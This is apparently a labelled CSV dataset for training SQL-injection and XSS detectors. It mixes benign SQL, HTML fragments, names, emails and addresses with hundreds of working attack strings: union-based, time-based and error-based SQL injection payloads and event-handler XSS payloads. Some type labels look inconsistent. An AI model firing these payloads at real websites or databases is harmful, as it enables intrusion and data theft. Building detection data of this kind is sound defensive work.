Text,Label,type
1' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'ixzr'  =  'ixzr,1,xss
"<details oncut=""alert(1)"" contenteditable>test</details>",2,xss
"<style>:target {color: red;}</style><samp id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></samp>",2,xss
tewksbur,0,xss
SELECT * FROM review 3 SELECT * FROM opposite,0,sql
gossett@conac.com.li,0,sql
"1'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'snad' like 'snad",1,sql
"<img onmouseover=""alert(1)"">test</img>",2,xss
"1%""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""%""  =  """,1,sql
"<li id=""cite_note-278""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-278"">^ </a> </b> ",0,xss
SELECT * FROM fix  WHERE noon NOT LIKE '[cent]%',0,sql
"1""  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,xss
"1%"" and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sql
SELECT * FROM dream WHERE value BETWEEN 'news' AND 'mud',0,xss
"1 union all select null,null,null,null,null,null,null--",1,sql
<i id=x tabindex=1 onactivate=alert(1)></i>,2,xss
"1' where 4860  =  4860 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
agres,0,xss
4.23384E+15,0,sql
"<iframe onkeyup=""alert(1)"" contenteditable>test</iframe>",2,xss
"<span onmouseleave=""alert(1)"">test</span>",2,xss
or 1  =  1--,1,sql
"c/ jose belso castao, s/n,",0,sql
 </ol> </div>,0,xss
"<li id=""cite_note-dechter1986-250""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-dechter1986_250-0"">^ </a> </b> ",0,xss
"   SELECT Employees.minute, COUNT ( Orders.statementID )  AS telephoneFROM    ( OrdersINNER JOIN wash ON Orders.hitID  =  Employees.comeID ) ",0,sql
"1"" where 3018  =  3018 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1,sql
SELECT * FROM welcome WHERE quarter = 'zebra',0,sql
"<basefont onkeyup=""alert(1)"" contenteditable>test</basefont>",2,xss
-2569' union all select 4484--,1,sql
rufino@citycvs.as,0,sql
"   SELECT city,four,spirit,temperature,jump     (  (  occur JOIN stepped ON occasionally.over =  till.compare )   INNER JOIN oppositeON Orders.manner =  disappear.afternoonID ) ",0,sql
"<listing oncut=""alert(1)"" contenteditable>test</listing>",2,xss
"<p class=""caption""><span class=""caption-text"">Solving specific problems",0,xss
"  SELECT Orders.mirrorrID, Employees.storm, Employees.still FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.landID ORDER BY Orders.certainlyID",0,xss
8clo736,0,xss
"1""  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  ""jozh""  =  ""jozh",1,sql
SELECT * FROM coach WHERE wonder LIKE '%know%',0,sql
"<div draggable=""true"" contenteditable>drag me</div><canvas ondragover=alert(1) contenteditable>drop here</canvas>",2,xss
" select * from users where id  =  1 or "".{"" or 1  =  1 -- 1",1,sql
"c/ francisco de ricci 23, 1?c",0,sql
mango_rizzo1@premiostv.ky,0,sql
"INSERT INTO truck ( laid, map, divide, unknown, trail, blood )  VALUES  ( 'seeing', 'activity'. zebra', 'stiff', 'remember', 'fierce', 'at' )  ",0,sql
"<li id=""cite_note-FOOTNOTEDreyfusDreyfus1986-107""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEDreyfusDreyfus1986_107-0"">^ </a> </b> ",0,xss
"1""  )   where 8196  =  8196",1,sql
"1%'   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
"1 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1,sql
1' and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'pnpx'  =  'pnpx,1,sql
17751,0,sql
"<li class=""toctree-l1""><a class=""reference internal"" href=""versioning.html"">Versioning and API Stability</a></li>",0,xss
	 <div>,0,xss
"<li><a href=""/wiki/World_Wide_Web"" title=""World Wide Web"">World Wide Web </a> </li>",0,xss
sant andreu salou,0,sql
baumgarten bagudanc,0,xss
malh5jo,0,sql
SELECT * FROM nothing WHERE quick NOT LIKE '[share]%',0,sql
SELECT * FROM bright FETCH FIRST 3 ROWS ONLY,0,sql
"-9947""   )    )     )   union all select 8765,8765,8765,8765,8765#",1,sql
SELECT MIN ( saw )  AS instance FROM either,0,xss
coca artero,0,sql
1   )    )    as skex where 7941  =  7941 and sleep  (  5  )  --,1,sql
ajoy,0,sql
castelln,0,sql
ajmet,0,xss
<menuitem onpointerdown=alert(1)>XSS</menuitem>,2,xss
 </li>,0,xss
SELECT order ( s )  FROM continued LEFT JOIN,0,sql
SELECT AVG ( its ) FROM write SELECT SUM ( nearly ) ,0,xss
	 </span> </li>,0,xss
" select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1",1,sql
"1'||  (  select 'wqmz' where 6400  =  6400 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x   )    )   ||'",1,sql
<ins onpointermove=alert(1)>XSS</ins>,2,xss
"<style>:target {transform: rotate(180deg);}</style><noframes id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></noframes>",2,xss
SELECT * FROM sell FETCH FIRST 3 ROWS ONLY,0,sql
 </li>,0,xss
"-4028  )   where 3244  =  3244 union all select 3244,3244,3244,3244,3244,3244,3244,3244--",1,sql
SELECT * FROM needs WHERE into BETWEEN printed09/01/1996prize AND exclaimed15/31/1996scale,0,sql
SELECT * FROM consider WHERE    NOT recently = 'seen',0,sql
-4768'||  (  select 'dded' from dual where 6499  =  6499 union all select 6499--,1,xss
SELECT TOP 3 * FROM softly,0,sql
 </li>,0,xss
"<style>:target {color: red;}</style><xmp id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></xmp>",2,xss
"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  ",1,sql
"<li><a href=""/wiki/Stuart_Kauffman"" title=""Stuart Kauffman"">Stuart Kauffman </a> </li>",0,xss
"1""   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""adwg"" like ""adwg",1,sql
"<summary onmouseenter=""alert(1)"">test</summary>",2,xss
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/deploy.html"">Deploying Spiders</a></li>",0,xss
SELECT smooth ( s )  FROM sugar UNION,0,sql
hoste ustrell,0,sql
-2707'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  'mwdq'  =  'mwdq,1,sql
sarri de ter,0,sql
SELECT * FROM had 3,0,sql
SELECT * FROM cream WHERE break = 'around',0,sql
17240,0,sql
"admin"" or 1  =  1/*",1,xss
<section onpointerleave=alert(1)>XSS</section>,2,xss
preixens,0,sql
alcolea,0,sql
subhashi,0,sql
1   )    )    as oqyo where 7995  =  7995,1,xss
koprulu,0,sql
1'||  (  select 'vasx' where 4770  =  4770 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||',1,sql
"<li id=""cite_note-AI_as_evolution-412""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-AI_as_evolution_412-0"">^ </a> </b> ",0,xss
SELECT zero FROM write UNION ALL SELECT future FROM police ORDER BY aid,0,xss
"1'   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'lwyo'  =  'lwyo",1,sql
georges,0,xss
"-4721'  )   or elt  (  4378  =  5165,5165  )   and   (  'fufn'  =  'fufn",1,sql
1'   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'foop' like 'foop,1,xss
"<li><cite id=""CITEREFNilsson1983"" class=""citation journal""><a href=""/wiki/Nils_Nilsson_(researcher)"" class=""mw-redirect"" title=""Nils Nilsson (researcher)"">Nilsson, Nils </a> (1983). <a rel=""nofollow"" class=""external text"" href=""https://ai.stanford.edu/~nilsson/OnlinePubs-Nils/General%20Essays/AIMag04-04-002.pdf"">""Artificial Intelligence Prepares for 2001"" </a> <span class=""cs1-format"">(PDF) ",0,xss
"<style>@keyframes x{}</style><image style=""animation-name:x"" onanimationstart=""alert(1)""></image>",2,xss
"1"" where 4213  =  4213 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
"<fieldset onmouseleave=""alert(1)"">test</fieldset>",2,xss
1%'   )    )    and 2006  =  2006,1,sql
calle torreta 126 9c,0,sql
 ,0,xss
"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,1,sql
1  )   as gbtj where 8175  =  8175,1,xss
<listing onpointerdown=alert(1)>XSS</listing>,2,xss
narbo_nesa,0,sql
fergus,0,xss
SELECT MIN ( loose )  AS arrow FROM these,0,sql
"<li><cite id=""CITEREFDreyfus1972"" class=""citation book""><a href=""/wiki/Hubert_Dreyfus"" title=""Hubert Dreyfus"">Dreyfus, Hubert </a> (1972). <a href=""/wiki/What_Computers_Can%27t_Do"" class=""mw-redirect"" title=""What Computers Can&#39;t Do""><i>What Computers Can't Do </i> </a>. New York: MIT Press. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-06-011082-6"" title=""Special:BookSources/978-0-06-011082-6""><bdi>978-0-06-011082-6 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=What+Computers+Can%27t+Do&amp;rft.place=New+York&amp;rft.pub=MIT+Press&amp;rft.date=1972&amp;rft.isbn=978-0-06-011082-6&amp;rft.aulast=Dreyfus&amp;rft.aufirst=Hubert&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
3.55661E+15,0,sql
3.88E+15,0,sql
<ruby id=x tabindex=1 onactivate=alert(1)></ruby>,2,xss
SELECT AVG ( third ) FROM whether,0,xss
"<audio draggable=""true"" ondragenter=""alert(1)"">test</audio>",2,xss
SELECT * FROM machine WHERE control BETWEEN '1996-07-01' AND '1996-07-31',0,sql
	 </span>,0,xss
6019,0,sql
SELECT TOP 3 * FROM could SELECT * FROM pressure 3SELECT * FROM seen,0,sql
SELECT * FROM entire WHERE NOT quiet = 'stone'  AND NOT airplane = 'automobile',0,sql
"  SELECT shine,sharp,progress FROM slope LEFT JOIN Orders ON impossible.explanationID =  shape.good ORDER BY join.bee",0,sql
select   (  case when   (  5847  =  2826  )   then 5847 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,sql
document.write,2,xss
"<dialog onkeyup=""alert(1)"" contenteditable>test</dialog>",2,xss
1  )   where 9344  =  9344,1,sql
SELECT * FROM Customers  WHERE City NOT LIKE '[bsp]%';,0,sql
1'||  (  select 'qgnz' where 6446  =  6446,1,xss
65658514t,0,xss
8739,0,sql
"<li class=""toclevel-2 tocsection-5""><a href=""#Reasoning,_problem_solving""><span class=""tocnumber"">4.1 ",0,xss
bateman@alojesuweb.in,0,sql
"<blink onkeydown=""alert(1)"" contenteditable>test</blink>",2,xss
<basefont onpointerleave=alert(1)>XSS</basefont>,2,xss
calle virgen de la macarena 72 2-c,0,sql
SELECT * FROM fuel FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM told,0,sql
"	 </span>. <a href=""/wiki/Bibcode"" title=""Bibcode"">Bibcode </a>:<a rel=""nofollow"" class=""external text"" href=""https://ui.adsabs.harvard.edu/abs/2007arXiv0706.3639L"">2007arXiv0706.3639L </a>. 07-07. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=report&amp;rft.btitle=A+Collection+of+Definitions+of+Intelligence&amp;rft.pub=IDSIA&amp;rft.date=2007-06-15&amp;rft_id=info%3Aarxiv%2F0706.3639&amp;rft_id=info%3Abibcode%2F2007arXiv0706.3639L&amp;rft.aulast=Legg&amp;rft.aufirst=Shane&amp;rft.au=Hutter%2C+Marcus&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
 UPDATE pour SET busy = 'sent'WHERE drawn = 'important',0,xss
1084,0,sql
SELECT AVG ( special ) FROM upper SELECT SUM ( term ) ,0,sql
de las muecas pedrol,0,sql
a24a70re8a,0,xss
"<ul><li><a href=""#CITEREFAlbus2002"">Albus 2002 </a> </li> </ul>",0,xss
"  SELECT necessaryID AS ID, taste AS voice FROM house",0,sql
"INSERT INTO son  ( observe, leaving, powder )  VALUES  ( 'greatest', 'apart', 'sure' )  ",0,sql
" select * from users where id  =  1 or ""_;"" or 1  =  1 -- 1",1,xss
"1'||  (  select 'adiv' from dual where 9842  =  9842 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||'",1,xss
"<body class=""wy-body-for-nav"">   ",0,xss
"1'  )   as keom where 7524  =  7524 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
SELECT * FROM sweet WHERE living = 'yourself' LIMIT 3,0,sql
SELECT * FROM say WHERE triangle BETWEEN '1996-07-01' AND '1996-07-31',0,sql
SELECT AVG ( Price ) FROM applied,0,sql
"<caption onmousedown=""alert(1)"">test</caption>",2,xss
merkling,0,sql
"1""  )   where 7840  =  7840 union all select null,null#",1,sql
SELECT * FROM model WHERE    NOT mail = 'exactly',0,xss
"<style>:target {transform: rotate(180deg);}</style><q id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></q>",2,xss
"<multicol onmousemove=""alert(1)"">test</multicol>",2,xss
select sleep  (  5  )   and   (  'hhlq' like 'hhlq,1,sql
SELECT * FROM so WHERE    NOT nose = 'exercise',0,xss
stapley@cirugiaplasticacordoba.jm,0,xss
" SELECT column_name ( s )  FROM west,center",0,sql
SELECT * FROM  ( SELECT each FROM early ) ,0,xss
"1""  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""vudj"" like ""vudj",1,sql
" SELECT * FROM course ORDER BY compass ASC, board DESC",0,sql
	 </span>,0,xss
agote lledos,0,sql
"-9871""  )   union all select 9082#",1,sql
"-7738%""  )   union all select 8754,8754,8754,8754,8754,8754,8754,8754,8754#",1,sql
"<a onclick=""alert(1)"">test</a>",2,xss
"1%'   )    )    union all select null,null,null,null,null,null#",1,sql
1102,0,sql
"<menu onmouseleave=""alert(1)"">test</menu>",2,xss
educativa,0,sql
SELECT * FROM station WHERE trace = 'stiff'  AND  ( egg = 'whole' OR which = 'air' ) ,0,xss
"<tt onmouseleave=""alert(1)"">test</tt>",2,xss
<object onpointerdown=alert(1)>XSS</object>,2,xss
<colgroup id=x tabindex=1 onfocusin=alert(1)></colgroup>,2,xss
SELECT * FROM facing ORDER BY putting DESC,0,sql
nickonov,0,sql
"<rp draggable=""true"" ondragend=""alert(1)"">test</rp>",2,xss
"-5595""   )    )    as xttj where 4562  =  4562 union all select 4562,4562,4562,4562,4562#",1,sql
1%' or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,sql
"1'  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'wgbh'  =  'wgbh",1,sql
"1   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  6583  =  6583",1,sql
<input onpointerenter=alert(1)>XSS</input>,2,xss
SELECT small ( s )  FROM force LEFT JOIN,0,sql
SELECT * FROM born 3,0,sql
"1""  )   as piwi where 2918  =  2918",1,sql
"select * from generate_series  (  3379,3379,case when   (  3379  =  1219  )   then 1 else 0 end  )   limit 1--",1,sql
"<li><a href=""/wiki/Ethics_of_artificial_intelligence"" title=""Ethics of artificial intelligence"">Ethics of artificial intelligence </a> </li>",0,xss
SELECT * FROM common WHERE planned NOT BETWEEN 'satellites' AND 'victory',0,sql
"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'ukxj'  =  'ukxj",1,sql
"-5925  )   where 5758  =  5758 union all select 5758,5758,5758,5758,5758,5758,5758,5758,5758#",1,sql
"Default reasoning and <a href=""/wiki/Default_logic"" title=""Default logic"">default logic </a>, <a href=""/wiki/Non-monotonic_logic"" title=""Non-monotonic logic"">non-monotonic logics </a>, <a href=""/wiki/Circumscription_(logic)"" title=""Circumscription (logic)"">circumscription </a>, <a href=""/wiki/Closed_world_assumption"" class=""mw-redirect"" title=""Closed world assumption"">closed world assumption </a>, <a href=""/wiki/Abductive_reasoning"" title=""Abductive reasoning"">abduction </a> (Poole <i>et al. </i> places abduction under ""default reasoning"". Luger <i>et al. </i> places this under ""uncertain reasoning""):",0,xss
"<dt><a class=""reference internal"" href=""topics/dynamic-content.html""><span class=""doc"">Selecting dynamically-loaded content",0,xss
"INSERT INTO rapidly  ( afraid, softly, depth )  VALUES  ( 'local', 'rise', 'exercise' )  ",0,sql
"<li id=""cite_note-Learning_in_neural_networks-238""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Learning_in_neural_networks_238-0"">^ </a> </b> ",0,xss
	 </span> </h3>,0,xss
SELECT blanket ( s ) FROM standard INNER JOIN,0,sql
SELECT AVG ( failed ) FROM atomic SELECT SUM ( nation ) ,0,xss
trissenaar@tetdevelocidad.uk,0,sql
boggs@cocteleria.dz,0,sql
 </div>,0,xss
<noembed id=x tabindex=1 ondeactivate=alert(1)></noembed><input id=y autofocus>,2,xss
"<rb onbeforepaste=""alert(1)"" contenteditable>test</rb>",2,xss
linas,0,sql
<nav onpointerup=alert(1)>XSS</nav>,2,xss
-2679'   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'cutk' like 'cutk,1,sql
02056001p,0,xss
"<rp onmouseout=""alert(1)"">test</rp>",2,xss
"  SELECT * FROM dream WHERE open IN  ( 'student', 'grew', 'shorter' )  ",0,sql
	 </span>,0,xss
rasmia,0,xss
"<li><a href=""/wiki/Memex"" title=""Memex"">Memex </a><span class=""nowrap"">&#160; ",0,xss
"<source onpaste=""alert(1)"" contenteditable>test</source>",2,xss
SELECT * FROM soldier WHERE NOT leaf = 'completely'  AND NOT instant = 'threw',0,sql
caine@albeiteria.es,0,sql
UE1,1,sql
50529,0,sql
declare @s varchar   (  8000  )   select @s   =   0x73656c65637420404076657273696f6e,1,sql
"<nextid onpaste=""alert(1)"" contenteditable>test</nextid>",2,xss
cabada ferrus,0,xss
"-7146"" where 6431  =  6431 or 8548  =  5549--",1,xss
"<track onmouseout=""alert(1)"">test</track>",2,xss
SELECT * FROM said WHERE slowly = 'lose',0,sql
"<h3><span class=""mw-headline"" id=""Automotive"">Automotive ",0,xss
      </dl>,0,xss
"<shadow onmousedown=""alert(1)"">test</shadow>",2,xss
"   SELECT usual, exclaimed, occurFROM higher WHERE list  IS NOT NULL",0,xss
"-3059 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1,sql
 </li>,0,xss
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
"plza. musico diaz cano 5,",0,sql
SELECT * FROM breathing WHERE    NOT author = 'salt',0,sql
"1'  )   as jysm where 8961  =  8961 union all select null,null#",1,sql
firestone@artforall.ag,0,sql
"<textarea onmouseover=""alert(1)"">test</textarea>",2,xss
1%'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,xss
"c/ lorenzo solano tendero, s/n 8b",0,sql
"<slot onmousemove=""alert(1)"">test</slot>",2,xss
ninn,0,sql
SELECT * FROM label WHERE against = 'trade'  AND  ( heard = 'biggest' OR flow = 'simple' ) ,0,xss
"<style>:target {transform: rotate(180deg);}</style><picture id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></picture>",2,xss
SELECT * FROM fox WHERE four = 'tank'  AND City = 'carefully',0,xss
 </li>,0,xss
SELECT * FROM trade  WHERE captured NOT LIKE '[mostly]%',0,xss
SELECT safe ( s )  FROM stranger,0,xss
amoeiro,0,sql
SELECT TOP 3 * FROM music WHERE lovely = 'musical',0,sql
"1'+  (  select 'ewlk' where 1078  =  1078 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
"romeral, el",0,sql
"1  )   where 8856  =  8856 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
"1%'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  '%'  =  '",1,sql
mucientes,0,sql
select   (  case when   (  3325  =  1767  )   then 3325 else 3325*  (  select 3325 from mysql.db  )   end  )  #,1,xss
 </li>,0,xss
" SELECT * FROM effort ORDER BY information, somehow",0,sql
"<div draggable=""true"" contenteditable>drag me</div><pre ondragover=alert(1) contenteditable>drop here</pre>",2,xss
listeza,0,sql
 </div> </td> </tr> </tbody> </table> </div>,0,xss
"<big oncopy=""alert(1)"" contenteditable>test</big>",2,xss
SELECT * FROM screen WHERE hide = 'invented' LIMIT 3,0,xss
"1""  )   and 7533  =  7533 and   (  ""jfsw"" like ""jfsw",1,sql
SELECT * FROM wood WHERE NOT recent = 'tone'  AND NOT wore = 'those',0,sql
SELECT article ( s )  FROM easily LEFT JOIN,0,xss
AI becomes hugely successful in the early 21st century,0,xss
SELECT * FROM only,0,sql
"1',  (  select   (  case when   (  6894  =  6087  )   then 1 else 6894*  (  select 6894 from information_schema.character_sets  )   end   )    )   ",1,sql
<button id=x tabindex=1 onactivate=alert(1)></button>,2,xss
<datalist onfocusout=alert(1) tabindex=1 id=x></datalist><input autofocus>,2,xss
"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""tjbe"" like ""tjbe",1,xss
SELECT hundred ( s )  FROM sort LEFT JOIN,0,sql
SELECT * FROM were WHERE solve LIKE '%bat%',0,sql
"1""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""dplf"" like ""dplf",1,sql
"-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--",1,sql
zelada,0,sql
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""eaqk""  =  ""eaqk",1,sql
1'+  (  select 'xbyn' where 6881  =  6881,1,xss
bourne_sereys8@demasiado.com.ye,0,sql
1'||  (  select 'xqqp' where 3007  =  3007 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,sql
arme!lluela,0,sql
SELECT pen ( s )  FROM famous UNION ALL,0,sql
SELECT MIN ( food )  AS source FROM both,0,sql
SELECT AVG ( thought ) FROM forget SELECT SUM ( cutting ) ,0,sql
<iframe onblur=alert(1) id=x><input autofocus>,2,xss
"-9638   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  3679  =  3679",1,sql
SELECT tower ( s )  FROM sometime UNION,0,sql
"<img onbeforepaste=""alert(1)"" contenteditable>test</img>",2,xss
SELECT how,0,sql
SELECT * FROM hit WHERE company  BETWEEN 10 AND 20,0,sql
persaud,0,sql
SELECT * FROM outer WHERE great BETWEEN doing09/01/1996kind AND image15/31/1996oxygen,0,sql
SELECT adult ( s )  FROM neck FULL OUTER JOIN,0,sql
"SELECT * FROM dig WHERE kept BETWEEN ""stick"" AND    ""youth""",0,sql
SELECT AVG ( Price ) FROM gravity,0,sql
if  (  8264  =  1939  )   select 8264 else drop function nsoq--,1,sql
SELECT silk,0,sql
"1  )   as cnpv where 4902  =  4902 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1,xss
"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""hbfr"" like ""hbfr",1,sql
"<h3><span class=""mw-headline"" id=""Healthcare"">Healthcare ",0,xss
SELECT * FROM screen WHERE thank = 'across' FETCH FIRST 3 ROWS ONLY,0,sql
"  SELECT coffee,report,worried FROM combine LEFT JOIN Orders ON motion.armyID =  instance.driven ORDER BY last.composition",0,sql
48638626c,0,sql
zarzuela,0,sql
